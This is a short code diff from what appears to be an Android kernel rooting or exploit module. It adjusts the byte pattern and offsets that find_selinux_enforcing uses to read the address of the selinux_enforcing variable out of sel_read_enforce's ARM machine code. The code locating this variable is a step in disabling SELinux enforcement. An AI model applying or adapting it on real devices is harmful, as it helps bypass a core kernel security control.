@@ -11,13 +11,12 @@ unsigned int* find_selinux_enforcing(void){
   char *sym_sel_read_enforce = (char *)kallsyms_lookup_name("sel_read_enforce");
   int i=0;
   uint32_t selinux_temp = 0;
-  const char asm_sub[] = { 0x18, 0xD0, 0x4D, 0xE2 };
+  const char asm_sub[] = {0x1C, 0xD0, 0x4D, 0xE2};
   for (i =0; i < 128; i++){
-    //printk("0x%X ", sym_sel_read_enforce[i]);
     if(memcmp(&sym_sel_read_enforce[i], asm_sub, 4) == 0){
-      selinux_temp = *(unsigned int*)&sym_sel_read_enforce[i+12] & 0x000FFFFF;
+      selinux_temp = *(unsigned int*)&sym_sel_read_enforce[i+4] & 0x000FFFFF;
       selinux_temp = ((selinux_temp >> 4) & 0x0000F000) | (selinux_temp & (0x00000FFF));
-      selinux_temp |= (((*(unsigned int*)&(sym_sel_read_enforce[i+16])) << 16) & 0xFFFF0000);
+      selinux_temp |= (((*(unsigned int*)&(sym_sel_read_enforce[i+8])) << 16) & 0xFFFF0000);
       return (unsigned int*)selinux_temp;
     }
   }
